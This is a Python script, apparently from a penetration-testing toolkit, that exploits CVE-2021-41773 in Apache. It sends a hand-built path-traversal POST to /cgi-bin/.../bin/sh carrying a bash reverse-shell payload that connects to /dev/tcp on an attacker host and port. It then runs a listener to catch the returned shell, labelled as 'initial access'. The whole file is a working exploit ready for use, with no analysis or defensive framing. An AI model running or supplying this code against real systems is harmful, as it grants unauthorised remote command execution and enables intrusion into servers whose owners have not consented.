import socket
import threading
import time
from urllib.parse import urlparse


def fire_exploit(target_url, lhost, lport):
    """Send the Apache RCE exploit via a raw TCP socket.
    The HTTP request is built by hand because both `requests` and `urllib3`
    re-encode the `%` characters in the path (`%32%65` → `%2532%2565`),
    which destroys the path-traversal of CVE-2021-41773. Raw socket = no
    normalisation.
    """
    time.sleep(1)  # give the listener a moment to come up

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    payload = (
        f"echo Content-Type: text/plain; echo; "
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )
    path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{payload}"
    )

    print(f"[*] Sending exploit to {host}:{port}{path}")

    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)  # the reverse shell hijacks the request, a short timeout is enough
        s.connect((host, port))
        s.sendall(request.encode())
    except (socket.timeout, ConnectionResetError):
        pass  # expected once the reverse shell takes over the connection
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def get_www_shell(target_ip, kali_ip, kali_port=4444):
    """
    Start the listener, send the exploit, and catch the shell.
    Returns the socket object (the reverse shell).
    """
    target_url = f"http://{target_ip}"

    # 1. Prepare the socket listener
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", kali_port))
    server.listen(1)
    print(f"[*] Initial-access listener started on port {kali_port}...")

    # 2. Fire the exploit in the background
    threading.Thread(target=fire_exploit, args=(target_url, kali_ip, kali_port)).start()

    # 3. Block until Apache calls back
    server.settimeout(15)  # wait up to 15 seconds for success
    try:
        www_shell, addr = server.accept()
        print(f"[+] Initial access successful. Shell received from {addr[0]}")
        return www_shell
    except socket.timeout:
        print("[-] Timeout — no shell received from Apache.")
        return None
    finally:
        server.close()  # release the listener port
